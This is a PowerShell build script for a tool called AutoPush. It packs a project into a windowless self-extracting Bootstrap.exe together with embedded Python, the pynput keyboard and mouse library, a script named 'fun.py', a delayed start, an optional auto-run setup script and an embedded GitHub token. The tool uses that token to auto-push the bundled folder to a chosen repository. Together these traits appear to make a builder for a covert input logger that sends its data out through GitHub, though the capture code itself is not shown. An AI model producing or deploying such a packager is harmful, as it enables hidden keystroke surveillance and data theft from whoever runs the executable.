
# ============================================================
# AutoPush - build.ps1
#
# Default:
#   .\build.ps1
#   -> Build dist\AutoPush.exe
#
# Pack:
#   .\build.ps1 -Pack .\my-project -Repo user/repo
#   .\build.ps1 -Pack .\my-project -Repo user/repo -Branch main
#   .\build.ps1 -Pack .\my-project -Repo user/repo -Branch main -Setup .\setup.ps1
#
# Requirements:
#   - Windows
#   - .NET Framework 4.x (csc.exe)
#   - Python Embedded 3.12 in .\pyembed
#   - Internet connection during build
# ============================================================

param(
    [string]$Pack,
    [string]$Repo,
    [string]$Branch = 'main',
    [string]$Setup
)

$ErrorActionPreference = 'Stop'

$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$dist = Join-Path $here 'dist'

$csc = "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\csc.exe"

if (-not (Test-Path $csc)) {
    $csc = "$env:WINDIR\Microsoft.NET\Framework\v4.0.30319\csc.exe"
}

if (-not (Test-Path $csc)) {
    throw "Cannot find csc.exe"
}

New-Item -ItemType Directory -Force $dist | Out-Null


# ============================================================
# HELPER: RUN NATIVE PROCESS
# ============================================================

function Invoke-Native {

    param(
        [Parameter(Mandatory = $true)]
        [string]$File,

        [Parameter(Mandatory = $true)]
        [string[]]$Arguments
    )

    $previousErrorAction = $ErrorActionPreference

    try {

        $ErrorActionPreference = 'Continue'

        $output = & $File @Arguments 2>&1
        $exitCode = $LASTEXITCODE

        return [PSCustomObject]@{
            ExitCode = $exitCode
            Output   = @($output)
        }

    }
    finally {
        $ErrorActionPreference = $previousErrorAction
    }
}


# ============================================================
# BUILD AUTOPUSH
# ============================================================

function Build-AutoPush {

    Write-Host ""
    Write-Host "===== BUILD AUTOPUSH =====" -ForegroundColor Cyan

    & $csc /nologo /target:winexe /optimize+ `
        "/out:$dist\AutoPush.exe" `
        /r:System.Web.Extensions.dll `
        "$here\src\AutoPush.cs"

    if ($LASTEXITCODE -ne 0) {
        throw "Build AutoPush failed"
    }

    if (-not (Test-Path "$dist\config.json")) {
        Copy-Item "$here\config.example.json" "$dist\config.json"
    }

    Write-Host "OK -> $dist\AutoPush.exe" -ForegroundColor Green
}


# ============================================================
# INSTALL PIP + PYNPUT
# ============================================================

function Install-Pynput {

    param(
        [Parameter(Mandatory = $true)]
        [string]$PythonDir
    )

    $python = Join-Path $PythonDir 'python.exe'

    if (-not (Test-Path $python)) {
        throw "Cannot find python.exe: $python"
    }

    Write-Host ""
    Write-Host "===== SETUP PYTHON EMBEDDED =====" -ForegroundColor Cyan

    # --------------------------------------------------------
    # 1. Configure python._pth
    # --------------------------------------------------------

    $pth = Get-ChildItem $PythonDir -Filter 'python*._pth' |
        Select-Object -First 1

    if (-not $pth) {
        throw "Cannot find python312._pth"
    }

    $lines = @(Get-Content $pth.FullName)

    $lines = @(
        $lines | Where-Object {
            $_ -notmatch '^\s*Lib[\\/]site-packages\s*$' -and
            $_ -notmatch '^\s*#?\s*import site\s*$'
        }
    )

    $lines += 'Lib\site-packages'
    $lines += 'import site'

    Set-Content -Path $pth.FullName -Value $lines -Encoding ASCII

    Write-Host "Configured python._pth"

    # --------------------------------------------------------
    # 2. Create site-packages
    # --------------------------------------------------------

    $sitePackages = Join-Path $PythonDir 'Lib\site-packages'

    New-Item -ItemType Directory -Force $sitePackages | Out-Null

    # --------------------------------------------------------
    # 3. Check pip
    # --------------------------------------------------------

    Write-Host ""
    Write-Host "Checking pip..."

    $pipCheck = Invoke-Native `
        -File $python `
        -Arguments @('-m', 'pip', '--version')

    if ($pipCheck.ExitCode -ne 0) {

        Write-Host "Pip not found. Installing pip..." -ForegroundColor Yellow

        $getPip = Join-Path $env:TEMP 'get-pip-autopush.py'

        try {

            Invoke-WebRequest `
                -Uri 'https://bootstrap.pypa.io/get-pip.py' `
                -OutFile $getPip `
                -UseBasicParsing

            if (-not (Test-Path $getPip)) {
                throw "Cannot download get-pip.py"
            }

            $pipInstall = Invoke-Native `
                -File $python `
                -Arguments @($getPip, '--no-warn-script-location')

            $pipInstall.Output | ForEach-Object {
                Write-Host "$_"
            }

            if ($pipInstall.ExitCode -ne 0) {
                throw "Install pip failed: $($pipInstall.ExitCode)"
            }

            Write-Host "Pip installed successfully." -ForegroundColor Green

        }
        finally {
            Remove-Item $getPip -Force -ErrorAction SilentlyContinue
        }

    }
    else {

        Write-Host "Pip already installed." -ForegroundColor Green
    }

    # --------------------------------------------------------
    # 4. Install pynput
    # --------------------------------------------------------

    Write-Host ""
    Write-Host "===== INSTALL PYNPUT =====" -ForegroundColor Cyan

    $installResult = Invoke-Native `
        -File $python `
        -Arguments @(
            '-m',
            'pip',
            'install',
            '--disable-pip-version-check',
            '--no-warn-script-location',
            '--target',
            $sitePackages,
            'pynput'
        )

    $installResult.Output | ForEach-Object {
        Write-Host "$_"
    }

    if ($installResult.ExitCode -ne 0) {
        throw "Install pynput failed: $($installResult.ExitCode)"
    }

    Write-Host "pynput installed successfully." -ForegroundColor Green

    # --------------------------------------------------------
    # 5. Verify pynput
    # --------------------------------------------------------

    Write-Host ""
    Write-Host "===== VERIFY PYNPUT =====" -ForegroundColor Cyan

    # Use a Python script file instead of inline -c.
    # This avoids PowerShell argument parsing issues.

    $verifyScript = Join-Path $PythonDir '_verify_pynput.py'

    @'
import pynput.keyboard
import pynput.mouse

print("pynput OK")
'@ | Set-Content -Path $verifyScript -Encoding ASCII

    try {

        $verifyResult = Invoke-Native `
            -File $python `
            -Arguments @($verifyScript)

        $verifyResult.Output | ForEach-Object {
            Write-Host "$_"
        }

        if ($verifyResult.ExitCode -ne 0) {
            throw "pynput verification failed: $($verifyResult.ExitCode)"
        }

    }
    finally {

        Remove-Item $verifyScript -Force -ErrorAction SilentlyContinue
    }

    Write-Host "Python Embedded ready." -ForegroundColor Green
}


# ============================================================
# DEFAULT BUILD
# ============================================================

if (-not $Pack) {

    Build-AutoPush

    return
}


# ============================================================
# VALIDATE PARAMETERS
# ============================================================

if (-not $Repo) {
    throw "Missing -Repo user/repo"
}

if (-not (Test-Path $Pack -PathType Container)) {
    throw "SourceDir does not exist: $Pack"
}

if ($Setup -and -not (Test-Path $Setup -PathType Leaf)) {
    throw "Setup script does not exist: $Setup"
}


# ============================================================
# BUILD AUTOPUSH
# ============================================================

Build-AutoPush

$src = (Resolve-Path $Pack).Path


# ============================================================
# READ TOKEN
# ============================================================

$token = ''

if (Test-Path "$dist\config.json") {

    $config = Get-Content "$dist\config.json" -Raw |
        ConvertFrom-Json

    $token = $config.token
}

if (-not $token -or $token -like '*xxx*') {
    Write-Warning "config.json does not contain a valid token."
}


# ============================================================
# CREATE STAGING
# ============================================================

$stage = Join-Path ([IO.Path]::GetTempPath()) (
    "appack_" + [Guid]::NewGuid().ToString('N')
)

New-Item -ItemType Directory -Force $stage | Out-Null

try {

    Write-Host ""
    Write-Host "===== CREATE STAGING =====" -ForegroundColor Cyan

    # --------------------------------------------------------
    # 1. Copy AutoPush.exe
    # --------------------------------------------------------

    Copy-Item "$dist\AutoPush.exe" $stage

    # --------------------------------------------------------
    # 2. Copy source
    # --------------------------------------------------------

    $srcOut = Join-Path $stage 'source'

    New-Item -ItemType Directory -Force $srcOut | Out-Null

    robocopy $src $srcOut /E `
        /XD .git node_modules bin obj .vs pyembed __pycache__ `
        /XF config.json autopush.log fun-log.txt payload.zip Bootstrap.exe `
        /NFL /NDL /NJH /NJS /NC /NS

    $robocopyExit = $LASTEXITCODE

    if ($robocopyExit -ge 8) {
        throw "Copy source failed. Robocopy exit code: $robocopyExit"
    }

    # --------------------------------------------------------
    # 3. Copy Python Embedded + install pynput
    # --------------------------------------------------------

    $runWith = @(
        'py "%SELF%\source\fun.py" || python "%SELF%\source\fun.py"'
    )

    $pythonSource = Join-Path $here 'pyembed\python.exe'

    if (Test-Path $pythonSource) {

        Write-Host ""
        Write-Host "===== COPY PYTHON EMBEDDED =====" -ForegroundColor Cyan

        $embeddedPython = Join-Path $stage 'pyembed'

        robocopy (Join-Path $here 'pyembed') $embeddedPython /E `
            /XD __pycache__ `
            /XF *.pyc `
            /NFL /NDL /NJH /NJS /NC /NS

        $robocopyExit = $LASTEXITCODE

        if ($robocopyExit -ge 8) {
            throw "Copy pyembed failed. Exit code: $robocopyExit"
        }

        Install-Pynput -PythonDir $embeddedPython

        $runWith = @(
            '"%SELF%\pyembed\python.exe" "%SELF%\source\fun.py"'
        )

        Write-Host "Python Embedded + pynput ready." -ForegroundColor Green

    }
    else {

        Write-Warning "No pyembed found. Target machine requires Python."
    }

    # --------------------------------------------------------
    # 4. Generate config.json
    # --------------------------------------------------------

    $cfg = [ordered]@{

        token               = $token
        authorName          = ''
        authorEmail         = ''

        startupDelaySeconds = 30
        maxFileSizeMB       = 50

        exclude = @(
            'node_modules'
            'bin'
            'obj'
            '.vs'
            '__pycache__'
            '*.log'
            'config.json'
            'Bootstrap.exe'
            'pyembed'
        )

        runWith = $runWith

        projects = @(
            @{
                path   = '%SELF%\source'
                repo   = $Repo
                branch = $Branch
            }
        )
    }

    ($cfg | ConvertTo-Json -Depth 6) |
        Set-Content -Encoding utf8 (Join-Path $stage 'config.json')

    # --------------------------------------------------------
    # 5. Copy setup script
    # --------------------------------------------------------

    if ($Setup) {

        Write-Host "Copying setup script..."

        $setupPath = (Resolve-Path $Setup).Path
        $ext = [IO.Path]::GetExtension($setupPath)

        Copy-Item $setupPath (
            Join-Path $stage ("autosetup" + $ext)
        )
    }

    # --------------------------------------------------------
    # 6. Create payload.zip
    # --------------------------------------------------------

    Write-Host ""
    Write-Host "===== CREATE PAYLOAD =====" -ForegroundColor Cyan

    $zip = Join-Path $dist 'payload.zip'

    if (Test-Path $zip) {
        Remove-Item $zip -Force
    }

    Add-Type -AssemblyName System.IO.Compression.FileSystem

    [IO.Compression.ZipFile]::CreateFromDirectory(
        $stage,
        $zip,
        [IO.Compression.CompressionLevel]::Optimal,
        $false
    )

    # --------------------------------------------------------
    # 7. Build Bootstrap.exe
    # --------------------------------------------------------

    Write-Host ""
    Write-Host "===== BUILD BOOTSTRAP =====" -ForegroundColor Cyan

    & $csc /nologo /target:winexe /optimize+ `
        "/out:$dist\Bootstrap.exe" `
        /r:System.IO.Compression.dll `
        /r:System.IO.Compression.FileSystem.dll `
        "/resource:$zip,payload" `
        "$here\src\Bootstrap.cs"

    if ($LASTEXITCODE -ne 0) {
        throw "Build Bootstrap failed"
    }

    # --------------------------------------------------------
    # 8. Cleanup payload.zip
    # --------------------------------------------------------

    Remove-Item $zip -Force -ErrorAction SilentlyContinue

    # --------------------------------------------------------
    # 9. Summary
    # --------------------------------------------------------

    Write-Host ""
    Write-Host "========================================" -ForegroundColor Green
    Write-Host "BUILD COMPLETED" -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Green

    Write-Host "Bootstrap : $dist\Bootstrap.exe"
    Write-Host "Repository: $Repo"
    Write-Host "Branch    : $Branch"

    if ($token -and $token -notlike '*xxx*') {
        Write-Warning "Bootstrap.exe CONTAINS GITHUB TOKEN. DO NOT SHARE!"
    }

}
finally {

    Remove-Item -Recurse -Force $stage -ErrorAction SilentlyContinue
}
